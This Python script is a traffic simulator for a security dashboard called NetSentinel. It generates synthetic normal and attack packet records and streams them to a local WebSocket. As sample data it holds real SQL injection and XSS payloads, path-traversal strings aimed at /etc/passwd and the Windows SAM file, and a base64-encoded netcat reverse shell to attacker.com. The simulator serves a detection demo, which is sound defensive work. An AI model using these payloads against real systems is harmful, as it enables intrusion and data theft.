#!/usr/bin/env python3
import asyncio
import websockets
import json
import random
import time
from datetime import datetime
import string
import base64
from typing import Dict, List, Any

class TrafficSimulator:
    def __init__(self, ws_url: str = "ws://localhost:8765"):
        self.ws_url = ws_url
        self.websocket = None
        self.running = True
        self.packet_id = 0
        
        # Common user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "curl/7.68.0",
            "PostmanRuntime/7.28.4",
            "python-requests/2.28.0"
        ]
        
        # Common IPs for simulation
        self.source_ips = [
            "192.168.1.100", "192.168.1.101", "192.168.1.102",
            "10.0.0.50", "10.0.0.51", "172.16.0.10",
            "203.0.113.1", "198.51.100.1", "8.8.8.8"
        ]
        
        self.target_ips = [
            "192.168.1.1", "10.0.0.1", "172.16.0.1",
            "192.168.1.200", "10.0.0.100"
        ]

    def generate_normal_traffic(self) -> Dict[str, Any]:
        """Generate normal HTTP/HTTPS traffic patterns"""
        paths = [
            "/", "/index.html", "/api/users", "/api/products",
            "/login", "/dashboard", "/about", "/contact",
            "/api/v1/status", "/health", "/metrics"
        ]
        
        methods = ["GET", "POST", "PUT", "DELETE"]
        method_weights = [70, 20, 5, 5]  # GET is most common
        
        packet = {
            "id": self.packet_id,
            "timestamp": datetime.now().isoformat(),
            "type": "normal",
            "source_ip": random.choice(self.source_ips),
            "dest_ip": random.choice(self.target_ips),
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice([80, 443, 8080, 8443]),
            "protocol": random.choice(["HTTP", "HTTPS"]),
            "method": random.choices(methods, weights=method_weights)[0],
            "path": random.choice(paths),
            "user_agent": random.choice(self.user_agents),
            "payload_size": random.randint(100, 2000),
            "status_code": random.choices([200, 201, 204, 301, 302, 400, 401, 403, 404, 500], 
                                         weights=[60, 10, 5, 5, 5, 3, 3, 3, 3, 3])[0],
            "threat_level": 0,
            "anomaly_score": random.uniform(0, 0.2)
        }
        
        self.packet_id += 1
        return packet

    def generate_sql_injection_attack(self) -> Dict[str, Any]:
        """Generate SQL injection attack patterns"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL, username, password FROM users--",
            "admin' --",
            "' OR 1=1 --",
            "1' AND 1=1 UNION ALL SELECT 1,2,3,4,5--",
            "' UNION SELECT database(), user(), version()--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        packet = {
            "id": self.packet_id,
            "timestamp": datetime.now().isoformat(),
            "type": "sql_injection",
            "source_ip": random.choice(["45.142.114.231", "185.220.101.45", "23.129.64.190"]),
            "dest_ip": random.choice(self.target_ips),
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice([80, 443, 3306]),
            "protocol": "HTTP",
            "method": "POST",
            "path": random.choice(["/login", "/api/auth", "/admin", "/search"]),
            "user_agent": random.choice(self.user_agents),
            "payload": random.choice(sql_payloads),
            "payload_size": random.randint(200, 500),
            "threat_level": random.randint(7, 10),
            "anomaly_score": random.uniform(0.7, 1.0),
            "attack_signature": "SQL_INJECTION_DETECTED"
        }
        
        self.packet_id += 1
        return packet

    def generate_xss_attack(self) -> Dict[str, Any]:
        """Generate XSS attack patterns"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='<script>alert('XSS')</script>'>"
        ]
        
        packet = {
            "id": self.packet_id,
            "timestamp": datetime.now().isoformat(),
            "type": "xss",
            "source_ip": random.choice(["87.120.36.157", "91.92.109.43", "185.165.168.77"]),
            "dest_ip": random.choice(self.target_ips),
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice([80, 443]),
            "protocol": "HTTP",
            "method": random.choice(["GET", "POST"]),
            "path": random.choice(["/comment", "/profile", "/search", "/forum/post"]),
            "user_agent": random.choice(self.user_agents),
            "payload": random.choice(xss_payloads),
            "payload_size": random.randint(150, 400),
            "threat_level": random.randint(6, 9),
            "anomaly_score": random.uniform(0.6, 0.95),
            "attack_signature": "XSS_DETECTED"
        }
        
        self.packet_id += 1
        return packet

    def generate_ddos_pattern(self) -> List[Dict[str, Any]]:
        """Generate DDoS attack pattern (burst of requests)"""
        packets = []
        source_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        target = random.choice(self.target_ips)
        
        for _ in range(random.randint(50, 200)):
            packet = {
                "id": self.packet_id,
                "timestamp": datetime.now().isoformat(),
                "type": "ddos",
                "source_ip": source_ip,
                "dest_ip": target,
                "source_port": random.randint(1024, 65535),
                "dest_port": 80,
                "protocol": "TCP",
                "method": "SYN",
                "payload_size": 64,
                "threat_level": 8,
                "anomaly_score": 0.9,
                "attack_signature": "DDOS_SYN_FLOOD"
            }
            self.packet_id += 1
            packets.append(packet)
        
        return packets

    def generate_port_scan(self) -> List[Dict[str, Any]]:
        """Generate port scanning pattern"""
        packets = []
        scanner_ip = f"45.33.{random.randint(1, 254)}.{random.randint(1, 254)}"
        target = random.choice(self.target_ips)
        
        common_ports = [21, 22, 23, 25, 80, 443, 445, 1433, 3306, 3389, 5432, 8080]
        
        for port in common_ports:
            packet = {
                "id": self.packet_id,
                "timestamp": datetime.now().isoformat(),
                "type": "port_scan",
                "source_ip": scanner_ip,
                "dest_ip": target,
                "source_port": random.randint(40000, 60000),
                "dest_port": port,
                "protocol": "TCP",
                "flags": "SYN",
                "payload_size": 0,
                "threat_level": 5,
                "anomaly_score": 0.7,
                "attack_signature": "PORT_SCAN_DETECTED"
            }
            self.packet_id += 1
            packets.append(packet)
        
        return packets

    def generate_malware_payload(self) -> Dict[str, Any]:
        """Generate malware/payload injection attempts"""
        malware_signatures = [
            base64.b64encode(b"nc -e /bin/sh attacker.com 4444").decode(),
            base64.b64encode(b"powershell -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQ").decode(),
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            base64.b64encode(b"\x4d\x5a\x90\x00\x03\x00\x00\x00").decode(),  # PE header
        ]
        
        packet = {
            "id": self.packet_id,
            "timestamp": datetime.now().isoformat(),
            "type": "malware",
            "source_ip": random.choice(["185.117.88.99", "45.148.10.88", "194.147.78.155"]),
            "dest_ip": random.choice(self.target_ips),
            "source_port": random.randint(1024, 65535),
            "dest_port": random.choice([80, 443, 445, 3389]),
            "protocol": random.choice(["HTTP", "SMB", "RDP"]),
            "method": "POST",
            "path": "/upload",
            "payload": random.choice(malware_signatures),
            "payload_size": random.randint(1000, 5000),
            "threat_level": random.randint(8, 10),
            "anomaly_score": random.uniform(0.85, 1.0),
            "attack_signature": "MALWARE_PAYLOAD_DETECTED"
        }
        
        self.packet_id += 1
        return packet

    async def send_packet(self, packet: Dict[str, Any]):
        """Send packet via WebSocket"""
        if self.websocket:
            message = {
                "type": "packet",
                "data": packet
            }
            await self.websocket.send(json.dumps(message))
            print(f"Sent {packet['type']} packet #{packet['id']}")

    async def simulate_traffic(self):
        """Main traffic simulation loop"""
        print("Starting traffic simulation...")
        
        while self.running:
            # Weighted choice of traffic type
            traffic_types = ["normal", "normal", "normal", "normal", "normal",  # 50% normal
                           "sql_injection", "xss", "ddos", "port_scan", "malware"]
            
            traffic_type = random.choice(traffic_types)
            
            try:
                if traffic_type == "normal":
                    packet = self.generate_normal_traffic()
                    await self.send_packet(packet)
                    await asyncio.sleep(random.uniform(0.1, 2.0))
                    
                elif traffic_type == "sql_injection":
                    packet = self.generate_sql_injection_attack()
                    await self.send_packet(packet)
                    # Agent analysis simulation
                    await asyncio.sleep(0.5)
                    await self.send_agent_status("sql_injection", "analyzing", packet['id'])
                    await asyncio.sleep(1.5)
                    await self.send_agent_status("sql_injection", "detected", packet['id'])
                    
                elif traffic_type == "xss":
                    packet = self.generate_xss_attack()
                    await self.send_packet(packet)
                    # Agent analysis simulation
                    await asyncio.sleep(0.5)
                    await self.send_agent_status("xss", "analyzing", packet['id'])
                    await asyncio.sleep(1.5)
                    await self.send_agent_status("xss", "detected", packet['id'])
                    
                elif traffic_type == "ddos":
                    packets = self.generate_ddos_pattern()
                    for packet in packets[:10]:  # Send first 10 rapidly
                        await self.send_packet(packet)
                        await asyncio.sleep(0.01)
                    await self.send_agent_status("payload", "analyzing", packets[0]['id'])
                    
                elif traffic_type == "port_scan":
                    packets = self.generate_port_scan()
                    for packet in packets:
                        await self.send_packet(packet)
                        await asyncio.sleep(0.1)
                    await self.send_agent_status("payload", "detected", packets[0]['id'])
                    
                elif traffic_type == "malware":
                    packet = self.generate_malware_payload()
                    await self.send_packet(packet)
                    await asyncio.sleep(0.5)
                    await self.send_agent_status("payload", "analyzing", packet['id'])
                    await asyncio.sleep(2.0)
                    await self.send_agent_status("payload", "detected", packet['id'])
                
                # Random delay between packets
                await asyncio.sleep(random.uniform(0.5, 3.0))
                
            except Exception as e:
                print(f"Error sending packet: {e}")
                await asyncio.sleep(1)

    async def send_agent_status(self, agent_type: str, status: str, packet_id: int):
        """Send agent analysis status update"""
        if self.websocket:
            message = {
                "type": "agent_status",
                "data": {
                    "agent": agent_type,
                    "status": status,
                    "packet_id": packet_id,
                    "timestamp": datetime.now().isoformat(),
                    "confidence": random.uniform(0.85, 0.99)
                }
            }
            await self.websocket.send(json.dumps(message))
            print(f"Agent {agent_type} status: {status} for packet #{packet_id}")

    async def heartbeat(self):
        """Send periodic heartbeat to keep connection alive"""
        while self.running:
            if self.websocket:
                try:
                    await self.websocket.send(json.dumps({
                        "type": "heartbeat",
                        "timestamp": datetime.now().isoformat()
                    }))
                    print("♥ Heartbeat sent")
                except:
                    print("Failed to send heartbeat")
            await asyncio.sleep(30)  # Heartbeat every 30 seconds

    async def connect_and_run(self):
        """Connect to WebSocket and run simulation"""
        while self.running:
            try:
                print(f"Connecting to {self.ws_url}...")
                async with websockets.connect(self.ws_url) as websocket:
                    self.websocket = websocket
                    print("Connected to WebSocket server!")
                    
                    # Send initial connection message
                    await websocket.send(json.dumps({
                        "type": "connection",
                        "client": "traffic_simulator",
                        "timestamp": datetime.now().isoformat()
                    }))
                    
                    # Run simulation and heartbeat concurrently
                    await asyncio.gather(
                        self.simulate_traffic(),
                        self.heartbeat()
                    )
                    
            except (websockets.exceptions.ConnectionClosed, 
                    websockets.exceptions.WebSocketException,
                    ConnectionRefusedError) as e:
                print(f"WebSocket connection lost: {e}")
                print("Reconnecting in 5 seconds...")
                self.websocket = None
                await asyncio.sleep(5)
            except KeyboardInterrupt:
                print("\nStopping simulation...")
                self.running = False
                break
            except Exception as e:
                print(f"Unexpected error: {e}")
                await asyncio.sleep(5)

async def main():
    simulator = TrafficSimulator("ws://localhost:8765")
    await simulator.connect_and_run()

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║     NetSentinel Traffic Simulator        ║
    ║     Real-time Attack & Traffic Gen       ║
    ╚══════════════════════════════════════════╝
    
    Traffic Types:
    - Normal HTTP/HTTPS traffic (50%)
    - SQL Injection attacks
    - XSS attacks
    - DDoS patterns
    - Port scanning
    - Malware payloads
    
    Press Ctrl+C to stop simulation
    """)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nSimulation stopped.")